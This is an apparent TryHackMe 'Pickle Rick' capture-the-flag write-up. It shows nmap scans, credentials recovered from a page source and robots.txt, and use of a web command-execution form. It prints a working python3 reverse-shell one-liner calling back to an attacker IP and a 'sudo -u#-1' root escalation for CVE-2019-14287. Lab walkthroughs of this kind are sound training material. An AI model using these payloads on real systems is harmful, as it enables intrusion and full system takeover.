
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Pickle%20rick/images/86-1.png)

In this room i found the username in the source page and the password in a common file. By deducing i found s login which had a form that executes unix commands. Naturally i crafted a reverse shell payload and started to search the ingredients. The privesc was easy as the sudo version was vulnerable to CVE-2019-14287. 

As always, the nmap scans.

```
nmap -sS -T4 -p- 10.10.211.197
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 06:09 EDT
Nmap scan report for 10.10.211.197
Host is up (0.056s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


```
nmap -sV -sC  -p22,80 10.10.211.197
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 06:08 EDT
Nmap scan report for 10.10.211.197
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:23:8a:51:fe:5e:df:7e:21:a7:68:86:25:53:93:13 (RSA)
|   256 2e:dc:f5:e4:76:91:03:bc:4c:db:79:23:f1:fa:15:cc (ECDSA)
|_  256 89:31:b8:21:d2:3b:03:27:61:7e:ca:f7:6f:32:95:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The first page.
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Pickle%20rick/images/86-2.png)

The page source has this message along with a  username. This username can be used to login via ssh or a login form.
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Pickle%20rick/images/86-3.png)

The robots.txt has this string which is not a file on a server, but may be used as a password.
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Pickle%20rick/images/86-4.png)

In this case i guessed there is a login.php file, and i can login with the found credentials.
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Pickle%20rick/images/86-5.png)

The redirected page has this input field which executes bash commands.
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Pickle%20rick/images/86-6.png)

Let's see what is on the current directory.
![alt text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Pickle%20rick/images/86-7.png)

I cannot use cat, but there are other ways of reading files like less, more, strings. I just used less.

The contents of clue.txt
```
Look around the file system for the other ingredient.
```

Out of commodity i will use a reverse shell with the payload below.
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.5.181",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```


This time i didn't made screen captures as i wanted to test how it look like with only text. The second ingredient is in rick folder, not rick's folder, because there is no user rick.

```
www-data@ip-10-10-16-214:/home/rick$ ls -la
ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

To read the file it is necessary to specify the \.  cat second\ ingredients

The third one, i think it must be in the root directory. I recently finished the  sudovuln series and wanted to use what i learned. 

```
www-data@ip-10-10-16-214:/$ sudo -V
sudo -V
Sudo version 1.8.16
Sudoers policy plugin version 1.8.16
Sudoers file grammar version 45
Sudoers I/O plugin version 1.8.16
```

Based on the sudo version, this system is vulnerable to CVE-2019-14287.

```
www-data@ip-10-10-16-214:/$ sudo -u#-1 /bin/sh
sudo -u#-1 /bin/sh
# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

Now that i am root i can access anything on the system.  

```
# cd root
cd root
# ls
ls
3rd.txt  snap
```
As i thought, the third flag was in the root directory.




